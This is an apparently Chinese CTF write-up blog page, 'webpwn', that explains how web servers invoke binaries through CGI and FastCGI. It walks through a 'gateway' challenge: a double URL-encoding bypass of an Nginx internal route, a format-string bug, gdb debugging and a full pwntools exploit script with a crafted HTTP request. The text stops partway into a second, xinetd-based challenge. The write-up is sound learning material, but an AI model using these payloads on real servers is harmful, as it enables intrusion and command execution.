@@ -1,0 +1,812 @@
+
+<!DOCTYPE html>
+<html lang="ch">
+<head>
+    <meta charset="utf-8" />
+    <title>webpwn | Collectcrop&#39;s Blog</title>
+    <meta name="author" content="collectcrop" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>COLLECTCROP&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;COLLECTCROP&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>webpwn</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/9/21
+        </span>
+        
+        <span class="category">
+            <a href="/categories/pwn/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                pwn
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/pwn/" style="color: #ff7d73">
+                    pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/web/" style="color: #ffa2c4">
+                    web
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="一、web与pwn的联系"><a href="#一、web与pwn的联系" class="headerlink" title="一、web与pwn的联系"></a>一、web与pwn的联系</h2><p>在某些 Web 服务中，会通过调用二进制程序来处理特定请求，尤其是在涉及动态内容生成、脚本执行、数据处理等场景时。以下是一些常见的例子：</p>
+<h4 id="1-CGI-Common-Gateway-Interface"><a href="#1-CGI-Common-Gateway-Interface" class="headerlink" title="1. CGI (Common Gateway Interface)"></a>1. <strong>CGI (Common Gateway Interface)</strong></h4><ul>
+<li><strong>概述：</strong> CGI 是一种通用的接口标准，允许 Web 服务器调用外部的二进制程序或脚本来生成动态内容。</li>
+<li><strong>调用方式：</strong> 当用户请求特定路径时，Web 服务器会通过 CGI 将请求转发给二进制程序（例如 C&#x2F;C++ 编写的可执行文件）。程序运行后将生成的输出（通常是 HTML）返回给用户。</li>
+<li><strong>示例：</strong> <code>httpd</code>、<code>nginx</code> 等服务器常通过 CGI 调用二进制文件，如 <code>/usr/lib/cgi-bin/</code> 中的程序。</li>
+</ul>
+<h4 id="2-FastCGI"><a href="#2-FastCGI" class="headerlink" title="2. FastCGI"></a>2. <strong>FastCGI</strong></h4><ul>
+<li><strong>概述：</strong> FastCGI 是 CGI 的增强版，通常用于调用长时间运行的二进制程序或脚本，以提高性能。</li>
+<li><strong>调用方式：</strong> Web 服务器将请求传递给 FastCGI 进程，该进程是一个长期运行的二进制程序，能快速处理多个请求，而不必每次请求都重新启动程序。</li>
+<li><strong>示例：</strong> PHP-FPM 就是一个常见的 FastCGI 进程管理器，它可以调用 PHP 解释器来处理请求。</li>
+</ul>
+<h4 id="3-后端服务调用"><a href="#3-后端服务调用" class="headerlink" title="3. 后端服务调用"></a>3. <strong>后端服务调用</strong></h4><ul>
+<li><strong>概述：</strong> 有些 Web 服务会在后台调用二进制程序来执行任务，例如图像处理、数据分析、或其他复杂计算。</li>
+<li><strong>调用方式：</strong> 通常通过系统调用（如 <code>exec</code> 或 <code>popen</code>）从 Web 应用程序（如 Python、Ruby、PHP 等）中调用二进制程序，并获取其输出结果。</li>
+<li><strong>示例：</strong> 图像处理库 ImageMagick 或者 FFMPEG 等工具经常在 Web 服务中被调用来处理用户上传的媒体文件。</li>
+</ul>
+<h4 id="4-嵌入式设备-Web-服务"><a href="#4-嵌入式设备-Web-服务" class="headerlink" title="4. 嵌入式设备 Web 服务"></a>4. <strong>嵌入式设备 Web 服务</strong></h4><ul>
+<li><strong>概述：</strong> 在一些嵌入式系统（如路由器、NAS 设备等）中，Web 界面通常用于配置设备，而这些界面可能会调用二进制程序来执行系统命令或获取状态信息。</li>
+<li><strong>调用方式：</strong> 嵌入式设备的 Web 服务器可能直接调用设备上的二进制文件来执行配置变更或获取系统状态。</li>
+<li><strong>示例：</strong> 路由器的管理界面可能调用二进制程序来重启设备或修改网络设置。</li>
+</ul>
+<h4 id="5-Server-Side-Includes-SSI"><a href="#5-Server-Side-Includes-SSI" class="headerlink" title="5. Server-Side Includes (SSI)"></a>5. <strong>Server-Side Includes (SSI)</strong></h4><ul>
+<li><strong>概述：</strong> SSI 是一种服务器端技术，允许在 HTML 文件中包含其他文件或执行命令行程序。</li>
+<li><strong>调用方式：</strong> 通过 SSI，可以在 HTML 中直接调用二进制程序，并将其输出嵌入到页面中。</li>
+<li><strong>示例：</strong> 例如，在 Apache 中，可以通过 <code>&lt;!--#exec cmd=&quot;path/to/program&quot;--&gt;</code> 来调用一个二进制程序并将其输出嵌入到 HTML 中。</li>
+</ul>
+<p>调用二进制程序的 Web 服务在动态内容生成和复杂任务处理时非常有用，尤其是在需要高效处理和利用已有二进制工具的情况下。使用这些技术时，可能会产生二进制的漏洞。</p>
+<h2 id="二、题目复现"><a href="#二、题目复现" class="headerlink" title="二、题目复现"></a>二、题目复现</h2><h3 id="1-gateway"><a href="#1-gateway" class="headerlink" title="1.gateway"></a>1.gateway</h3><p>以CGI产生的漏洞进行分析，这里分析时比较重要的是要在default文件里看Nginx配置信息。</p>
+<h4 id="Nginx配置信息"><a href="#Nginx配置信息" class="headerlink" title="Nginx配置信息"></a>Nginx配置信息</h4><pre><code class="nginx">listen 80 default_server;
+listen [::]:80 default_server;
+root /var/www/html;
+index index.html index.htm index.nginx-debian.html;
+server_name _;
+</code></pre>
+<p><strong>listen 80 default_server;</strong></p>
+<ul>
+<li>配置 Nginx 监听 <code>80</code> 端口，这是默认的 HTTP 端口。</li>
+<li><code>default_server</code> 表示这是默认的服务器块，当请求的主机名没有匹配到其他服务器块时，将使用此服务器块。</li>
+</ul>
+<p><strong>listen [::]:80 default_server;</strong></p>
+<ul>
+<li>这个指令与上面的类似，但它用于监听 IPv6 地址上的 <code>80</code> 端口。</li>
+</ul>
+<p><strong>root &#x2F;var&#x2F;www&#x2F;html;</strong></p>
+<ul>
+<li>定义服务器的根目录。当请求的 URI 没有指向具体文件时，Nginx 会在此目录中查找资源。</li>
+</ul>
+<p><strong>index index.html index.htm index.nginx-debian.html;</strong></p>
+<ul>
+<li>定义默认的主页文件列表。当用户访问一个目录时，Nginx 会依次查找这些文件作为首页。</li>
+</ul>
+<p><strong>server_name _;</strong></p>
+<ul>
+<li>设置服务器名。_ 表示匹配任何请求的服务器名。</li>
+</ul>
+<pre><code class="nginx">location / &#123;
+    # First attempt to serve request as file, then
+    # as directory, then fall back to displaying a 404.
+    try_files $uri $uri/ =404;
+&#125;
+
+location /cgi-bin/note_handler &#123;
+    internal;
+    proxy_set_header X-Forwarded-For 127.0.0.1;
+    proxy_pass http://127.0.0.1;
+&#125;
+
+    
+location /cgi-bin/ &#123;
+    if ($uri = &quot;/cgi-bin/note_handler&quot;) &#123;
+        return 403;
+    &#125;
+    expires +1h;
+    limit_rate 10k;
+    root /usr/share;
+    fastcgi_pass unix:/var/run/fcgiwrap.socket;
+    fastcgi_index /cgi-bin/http;
+    include /etc/nginx/fastcgi_params;
+    #fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+    fastcgi_param SCRIPT_FILENAME $document_root/cgi-bin/http;
+&#125;
+
+location /cgi-bin/forward &#123;
+    proxy_set_header X-Forwarded-For 127.0.0.1;
+    proxy_pass http://127.0.0.1/cgi-bin/http?action=print;
+&#125;
+
+location /get_flag &#123;
+    alias /tmp/flag;
+    default_type text/plain;
+&#125;
+</code></pre>
+<p><strong>location &#x2F; { … }</strong></p>
+<ul>
+<li>这个 <code>location</code> 块用于定义如何处理根路径 <code>/</code> 下的请求。<ul>
+<li><code>try_files $uri $uri/ =404;</code>：首先尝试按文件路径处理请求，如果找不到相应的文件或目录，则返回 <code>404</code> 错误。</li>
+</ul>
+</li>
+</ul>
+<p><strong>location &#x2F;cgi-bin&#x2F;note_handler { … }</strong></p>
+<ul>
+<li>这个 <code>location</code> 块内部处理 <code>/cgi-bin/note_handler</code> 的请求，并通过 <code>proxy_pass</code> 将请求转发到 <code>http://127.0.0.1</code>。<ul>
+<li><code>internal;</code>：这个指令表示该路径是内部路径，不能直接从外部访问。</li>
+<li><code>proxy_set_header</code> 设置了 <code>X-Forwarded-For</code> 头部为 <code>127.0.0.1</code>，通常用于标识原始请求的 IP 地址。</li>
+</ul>
+</li>
+</ul>
+<p><strong>location &#x2F;cgi-bin&#x2F; { … }</strong></p>
+<ul>
+<li>这个块定义了对 <code>/cgi-bin/</code> 目录下的请求的处理。<ul>
+<li><code>if ($uri = &quot;/cgi-bin/note_handler&quot;) &#123; return 403; &#125;</code>：如果请求的 URI 是 <code>/cgi-bin/note_handler</code>，则返回 <code>403 Forbidden</code>。</li>
+<li><code>expires +1h;</code>：设置响应缓存时间为1小时。</li>
+<li><code>limit_rate 10k;</code>：限制响应速率为 <code>10KB/s</code>。</li>
+<li><code>root /usr/share;</code>：定义此块的根目录为 <code>/usr/share</code>。</li>
+<li><code>fastcgi_pass</code> 和 <code>fastcgi_index</code> 指定了 FastCGI 处理脚本的位置。</li>
+<li><code>include /etc/nginx/fastcgi_params;</code> 包含了 FastCGI 的标准配置文件。</li>
+<li><code>fastcgi_param SCRIPT_FILENAME $document_root/cgi-bin/http;</code>：设置 <code>SCRIPT_FILENAME</code> 参数，指定 CGI 脚本的路径。</li>
+</ul>
+</li>
+</ul>
+<p><strong>location &#x2F;cgi-bin&#x2F;forward { … }</strong></p>
+<ul>
+<li>这个块处理 <code>/cgi-bin/forward</code> 请求，并将其代理到 <code>http://127.0.0.1/cgi-bin/http?action=print</code>。<ul>
+<li><code>proxy_set_header X-Forwarded-For 127.0.0.1;</code>：设置了 <code>X-Forwarded-For</code> 头部为 <code>127.0.0.1</code>。</li>
+<li><code>proxy_pass http://127.0.0.1/cgi-bin/http?action=print;</code>：将请求代理到指定的 URL。</li>
+</ul>
+</li>
+</ul>
+<p><strong>location &#x2F;get_flag { … }</strong></p>
+<ul>
+<li>这个块处理 <code>/get_flag</code> 请求。<ul>
+<li><code>alias /tmp/flag;</code>：将请求 <code>/get_flag</code> 映射到 <code>/tmp/flag</code> 文件。</li>
+<li><code>default_type text/plain;</code>：将响应的内容类型设置为 <code>text/plain</code>。</li>
+</ul>
+</li>
+</ul>
+<h4 id="cgi脚本信息"><a href="#cgi脚本信息" class="headerlink" title="cgi脚本信息"></a>cgi脚本信息</h4>
+
+<p>先是通过三个getenv函数获取环境变量。如果我们发起如下的请求</p>
+<pre><code class="list">http://example.com/cgi-bin/script?param1=value1&amp;param2=value2
+</code></pre>
+<p>该请求的参数会加入到服务器的环境变量，具体的环境变量值如下：</p>
+<ul>
+<li><code>REQUEST_METHOD</code>：<code>GET</code></li>
+<li><code>QUERY_STRING</code>：<code>param1=value1&amp;param2=value2</code></li>
+<li><code>SCRIPT_NAME</code>：<code>/cgi-bin/script</code></li>
+</ul>
+<p>后续的几个判断就是限制了各参数的长度，以及限制了用..来进行目录穿越的手段。其中比较重要的就是这个url_decode函数，其作用是进行url解码，也正是这个函数结合Nginx服务器的配置产生了漏洞。</p>
+
+
+<p>后续先对请求方式进行判断，如果不是GET的话最后会返回<code>&lt;html&gt;&lt;title&gt;403 FORBIDDEN&lt;/title&gt;&lt;body&gt;Method not support.&lt;/body&gt;&lt;/html&gt;</code>这样的页面。后面的循环实现了逐个取出get的参数，其中解析了action以及content这两个参数。而最主要的漏洞也就是发生在content参数会用<code>snprintf(v14, (size_t)&quot;%s&quot;, content, v6);</code>来处理，这个函数的参数设置产生了错误，导致格式化字符串%s被当成了一个数字大小来作为存到v14缓冲区的字节数量，而content也就成了解析的格式化字符串，于是产生了格式化字符串漏洞。</p>
+<p>然后我们来看看前面有个check函数，这个函数也就是我们需要构造条件来绕过的一个检测函数。</p>
+
+
+
+
+<p>我们发现这里主要做了两个检测，也就是<strong>X-Forwarded-For</strong>这个http请求头字段要为127.0.0.1。而且s1，也就是之前获取的cgi脚本路径要为**&#x2F;cgi-bin&#x2F;note_handler<strong>。然而之前在nginx配置中&#x2F;cgi-bin&#x2F;note_handler有用</strong>internal<strong>来指定其不能被外部请求访问，绕不开这个就不能进行下一步利用，这该怎么办呢？这时候前面的</strong>url_decode<strong>就起了作用，我们可以把&#x2F;cgi-bin&#x2F;note_handler转成其url编码的形式传入（其实只用编码一个字符就能够绕过检测），此时能够通过如上check函数，因为s1是解码后的url。这里需要注意的是，由于http请求到达nginx服务器时会</strong>先进行一次url解码**，所以如果我们想要把r进行url编码，直接转成%72是不够的，因为一开始它就被解码然后进location块而过不了检测。我们需要再把%也进行url编码，把r转成%2572输入，那么cgi程序最后调用url_decode后就得到了我们想要的&#x2F;cgi-bin&#x2F;note_handler。</p>
+
+
+<p>然后就是处理程序的主体逻辑了，使用之前与处理get参数相同的for循环来逐个获取以逗号分割的指令，实现了一个类似堆菜单题的操作。</p>
+
+
+<p>从这个add方法中可以看出，每个add的chunk中都有一个指向下一个节点的next域（<code>*((_QWORD *)dest + 13)</code>这个位置），全局变量dest存的是头节点。</p>
+
+
+<p>由于是每次释放掉链表头节点，每次都会更新头节点，所以不会有悬挂指针，就不存在UAF。</p>
+
+
+<p>edit功能没啥用，改的内容和原来content里的内容相同。</p>
+
+
+<p>print会遍历整个链表，可以展示每个节点的内容。</p>
+
+
+<p>get_flag就是一个后门函数，不过这里把获取到flag的内容重定向到&#x2F;dev&#x2F;null丢弃了，直接调用也不会显示flag内容。</p>
+<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><h5 id="如何调试"><a href="#如何调试" class="headerlink" title="如何调试"></a>如何调试</h5><p>由于在CGI环境中，Web服务器（如Nginx）会将HTTP请求中的某些信息解析并传递给运行的CGI程序作为环境变量。我们这里看到的参数都是通过getenv传递的。所以如果我们像正常做pwn题那样直接对二进制程序进行分析，会发现少了服务器将http请求解析到环境变量这一环节，这时我们需要寻求别的方式来进行调试。</p>
+<p>解决方法其实也很容易想到，既然是getenv加载参数，那么我们可以在gdb中直接来设置环境变量，这样之后就是正常的本地环境漏洞分析了。需要注意的是，本地在设置环境变量时都是模拟服务器处理后的参数，比如我们要传**&#x2F;cgi-bin&#x2F;note_handle%2572<strong>，在调试时就要经过一层url解码，传入的是</strong>&#x2F;cgi-bin&#x2F;note_handle%72**。</p>
+<p>大致的调试方法如下：</p>
+<pre><code class="python">p = process(&quot;./http&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+
+payload = &quot;action=add,print&amp;content=%p%p%p&quot;
+gdb.attach(p,f&#39;&#39;&#39;
+        set env REQUEST_METHOD GET
+        set env QUERY_STRING &quot;&#123;payload&#125;&quot;
+        set env SCRIPT_NAME /cgi-bin/note_handle%72
+        set env HTTP_X_FORWARDED_FOR 127.0.0.1
+        b getenv
+        r
+        &#39;&#39;&#39;)
+</code></pre>
+<p>这时我们可能会遇到如下问题</p>
+
+
+<p>首先猜测是地址对其的问题，这里rsi的值为0x7fffffffef86，rsi+rdx-0x40不是16字节对齐的，我们看看0x7fffffffef86附近的内存布局：</p>
+
+
+
+
+
+
+<p>可以发现这个getenv返回的是一个指向环境变量地址的指针，而且环境变量依次存在这个栈段的高地址处。我们可以尝试构造环境变量时使其大小刚好满足对齐条件试试。我首先是尝试把query_string那个环境变量变长从而把后面的script_name弄对齐，但是发现不会改变script_name值的位置。那么就猜测这个环境变量是从高地址往低地址存的，换一下环境变量设置的顺序后再改payload长度。</p>
+
+
+<p>此时就能不报上述错误继续调试，其实这里我在执行memcpy时rsi指针末位还是f，并没有对齐。这时可能就是原来rsi+rdx-0x40，也就是rsi+0x40这个地址已经越过了环境变量段，是一个不能访问的地址。而调换顺序后rsi+0x40仍然在环境变量这个可访问的地址当中。误打误撞也算是能够过了。（很有意思的是，gdb调试中可以继续，然而执行脚本的主程序的显示却是早早退出，显示403，但只要能够调试就行）。</p>
+<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>为了方便起见，一开始可以直接在print函数上打断点,这样一进去执行一下就能看到格式化字符串漏洞的执行效果。</p>
+<pre><code class="python">gdb.attach(p,f&#39;&#39;&#39;
+        set env REQUEST_METHOD GET
+        set env SCRIPT_NAME /cgi-bin/note_handle%72
+        set env QUERY_STRING &#123;payload&#125;
+        set env HTTP_X_FORWARDED_FOR 127.0.0.1
+        b getenv
+        r
+        delete break 1
+        b *(0x000000000401C7A)
+        c
+        &#39;&#39;&#39;)
+</code></pre>
+<p>经过调试我们可以确定，我们控制的content中的内容偏移为10。（用AAAAAAAA%10$p测得）</p>
+
+
+
+
+<p>之后修改puts的got表为system就行。</p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="python"># -*- coding=utf-8 -*-
+#!/usr/bin/env python3
+# A script for pwn exp
+from pwn import *
+import os
+import sys
+
+context.os = &#39;linux&#39;
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+
+LOCAL = 0
+LIBC = 1
+REMOTE = 0
+elf_path = &#39;./http&#39;
+libc_path = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
+code = ELF(elf_path)
+context.arch=code.arch
+
+
+r = lambda x: io.recv(x)
+ra = lambda: io.recvall()
+rl = lambda: io.recvline(keepends=True)
+ru = lambda x: io.recvuntil(x, drop=True)
+s = lambda x: io.send(x)
+sl = lambda x: io.sendline(x)
+sa = lambda x, y: io.sendafter(x, y)
+sla = lambda x, y: io.sendlineafter(x, y)
+ia = lambda: io.interactive()
+c = lambda: io.close()
+uu32    = lambda: u32(io.recvuntil(&quot;\xf7&quot;,drop=False)[-4:].ljust(4, b&quot;\x00&quot;))
+uu64    = lambda:u64(io.recvuntil(&quot;\x7f&quot;,drop=False)[-6:].ljust(8, b&quot;\x00&quot;))
+lg      = lambda s:io.success(&#39;\033[32m%s -&gt; 0x%x\033[0m&#39; % (s, eval(s)))
+li = lambda x: log.info(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)
+
+if len(sys.argv) == 1:
+    print (&quot;Welcome to  c0ke&#39;s simplified pwntools template!!!&quot;)
+    print (&quot;Usage : \n&quot;)
+    print (&quot;       python mode.py HOST PORT\n &quot;)
+    print (&quot;       python mode.py [0/1][debug]]\n &quot;)
+    exit()
+elif len(sys.argv)==2:
+    context.log_level = &#39;debug&#39;
+    if(sys.argv[1]== &#39;1&#39;):
+        LOCAL = 1
+    else:
+        LOCAL = 0
+else:
+    REMOTE = 1
+    server_ip = sys.argv[1]
+    server_port = int(sys.argv[2])
+
+
+
+# --------------------------func-----------------------------
+def db():
+    if (LOCAL):
+        gdb.attach(io,&#39;&#39;&#39;
+        b *0x0000000000401806
+
+
+        &#39;&#39;&#39;)
+        pause()
+
+def find_libc(func_name,func_ad):
+    p(func_name,func_ad)
+    global libc 
+    libc = LibcSearcher(func_name,func_ad)
+    libcbase=func_ad-libc.dump(func_name)
+    li(&#39;libcbase&#39;,libcbase)
+    return libcbase
+
+def cat_flag():
+    flag_header = b&#39;flag&#123;&#39;
+    sleep(1)
+    sl(&#39;cat flag&#39;)
+    ru(flag_header)
+    flag = flag_header + ru(&#39;&#125;&#39;) + b&#39;&#125;&#39;
+    exit(0)
+
+   
+
+
+
+# --------------------------exploit--------------------------
+def exploit():
+    li(&#39;exploit...&#39;)
+    code = &#39;cp /start.sh /tmp/flag&#39;
+    code = code + &#39;;&#39;
+    code = code.ljust(30, &#39;a&#39;) + &#39;;&#39;
+                                                                            
+    request = &quot;GET /cgi-bin/note_handle%2572?action=add,print,get_flag&amp;content=&#123;&#125;\(@@%30$c%30$c%30$c%30$c%30$c%136c%14$hhn HTTP/1.1\r\n&quot;.format(code)
+    request += &quot;Host: 127.0.0.1\r\n&quot;
+    request += &quot;Cache-Control: max-age=0\r\n&quot;
+    request += &quot;Upgrade-Insecure-Requests: 1\r\n&quot;
+    request += &quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36\r\n&quot;
+    request += &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n&quot;
+    request += &quot;X-Forwarded-For: 127.0.0.1\r\n&quot;
+    request += &quot;Accept-Encoding: gzip, deflate\r\n&quot;
+    request += &quot;Accept-Language: zh-CN,zh;q=0.9\r\n&quot;
+    request += &quot;If-Modified-Since: Mon, 08 Jul 2024 04:01:37 GMT\r\n&quot;
+    request += &quot;Connection: close\r\n&quot;
+    request += &quot;\r\n&quot;
+
+
+    db()
+    li(&quot;request  --------------&gt;\n%s&quot;%request)
+    s(request.encode())
+    response = r(0x2000)
+    print(response.decode())
+
+
+
+    
+def finish():
+    ia()
+    c()
+
+
+# --------------------------main-----------------------------
+if __name__ == &#39;__main__&#39;:
+    if REMOTE:
+        io = remote(server_ip, server_port)
+        if LIBC:
+            libc = ELF(libc_path)
+        elf = ELF(elf_path)
+    else:
+        elf = ELF(elf_path)
+        if LIBC:
+            libc = ELF(libc_path)
+            io = elf.process()
+        else:
+            io = elf.process()
+
+    exploit()
+    finish()
+</code></pre>
+<h3 id="2-desktop"><a href="#2-desktop" class="headerlink" title="2.desktop"></a>2.desktop</h3><h4 id="xinetd信息"><a href="#xinetd信息" class="headerlink" title="xinetd信息"></a>xinetd信息</h4><p><code>xinetd</code> 配置文件是用于配置和管理 <code>xinetd</code> 服务的文件。<code>xinetd</code>（Extended Internet Service Daemon）是一个超级服务器守护进程，用于管理和启动各种 Internet 服务（如 FTP、Telnet 等），它可以监听指定的端口并在有连接请求时启动相应的服务。</p>
+<h5 id="xinetd配置文件的主要类型"><a href="#xinetd配置文件的主要类型" class="headerlink" title="xinetd配置文件的主要类型"></a>xinetd配置文件的主要类型</h5><ol>
+<li><strong>主配置文件</strong> (<code>/etc/xinetd.conf</code>):<ul>
+<li>这是 <code>xinetd</code> 的全局配置文件，用于设置全局选项，如日志记录、服务目录等。</li>
+</ul>
+</li>
+<li><strong>服务配置文件</strong> (<code>/etc/xinetd.d/</code> 目录):<ul>
+<li>在这个目录中，每个文件定义了一个服务的配置。这些文件可以定义服务的启动方式、端口、协议、运行环境等。我们dockerfile中就有一句COPY .&#x2F;pwn.xinetd &#x2F;etc&#x2F;xinetd.d&#x2F;pwn，将配置导进去。</li>
+</ul>
+</li>
+</ol>
+<pre><code class="sh">service pwn
+&#123;
+    disable = no
+    flags = REUSE
+    socket_type = stream
+    protocol    = tcp
+    wait        = no
+    user        = root
+    type        = UNLISTED
+    port        = 1933
+    
+    bind        = 0.0.0.0
+    server      = /usr/sbin/chroot   
+    server_args = --userspec=1000:1000 /home/pwn ./pwn /var/www/html 2&gt;/dev/null
+    # safety options
+    per_source  = 5 # the maximum instances of this service per source IP address
+    rlimit_cpu  = 20 # the maximum number of CPU seconds that the service may use
+    rlimit_as  = 100M # the Address Space resource limit for the service
+    #access_times = 8:50-17:10
+&#125;
+</code></pre>
+<h5 id="相关设置解释"><a href="#相关设置解释" class="headerlink" title="相关设置解释"></a>相关设置解释</h5><p><strong><code>disable = no</code></strong>:</p>
+<ul>
+<li>表示该服务是启用的。</li>
+</ul>
+<p><strong><code>flags = REUSE</code></strong>:</p>
+<ul>
+<li>允许重用端口，使得服务能够在连接关闭后快速重新绑定端口。</li>
+</ul>
+<p><strong><code>socket_type = stream</code></strong>:</p>
+<ul>
+<li>指定服务使用流套接字（即 TCP），用于可靠的双向通信。</li>
+</ul>
+<p><strong><code>protocol = tcp</code></strong>:</p>
+<ul>
+<li>指定使用 TCP 协议。</li>
+</ul>
+<p><strong><code>wait = no</code></strong>:</p>
+<ul>
+<li>指定服务不等待新连接，而是立即返回并处理新的连接请求。</li>
+</ul>
+<p><strong><code>user = root</code></strong>:</p>
+<ul>
+<li>指定服务以 root 用户身份运行。这意味着服务将具有系统上最高权限，因此需要小心安全设置。</li>
+</ul>
+<p><strong><code>type = UNLISTED</code></strong>:</p>
+<ul>
+<li>表示服务不是标准服务（即不在服务列表中）。</li>
+</ul>
+<p><strong><code>port = 1933</code></strong>:</p>
+<ul>
+<li>指定服务监听的端口是 1933。我们就是把主机端口映射到这个端口。</li>
+</ul>
+<p><strong><code>bind = 0.0.0.0</code></strong>:</p>
+<ul>
+<li>表示服务绑定在所有网络接口上，允许来自任何 IP 地址的连接。</li>
+</ul>
+<p><strong><code>server = /usr/sbin/chroot</code></strong>:</p>
+<ul>
+<li>指定用于运行服务的命令。在这里，<code>chroot</code> 用于创建一个新的根文件系统环境，以限制服务的访问范围。</li>
+</ul>
+<p><strong><code>server_args = --userspec=1000:1000 /home/pwn ./pwn /var/www/html 2&gt;/dev/null</code></strong>:</p>
+<ul>
+<li><code>--userspec=1000:1000</code>：指定以用户 ID 1000 和组 ID 1000 的权限运行 <code>pwn</code> 程序。根据配置，用户 ID 1000 可能是 <code>pwn</code> 用户。</li>
+<li><code>/home/pwn</code>：指定 <code>chroot</code> 环境的根目录。</li>
+<li><code>./pwn</code>：指定要执行的二进制文件 <code>pwn</code>。这个路径相对于 <code>/home/pwn</code>。</li>
+<li><code>/var/www/html</code>：<code>pwn</code> 程序的参数，可能是 Web 服务器的根目录或其他服务相关目录。</li>
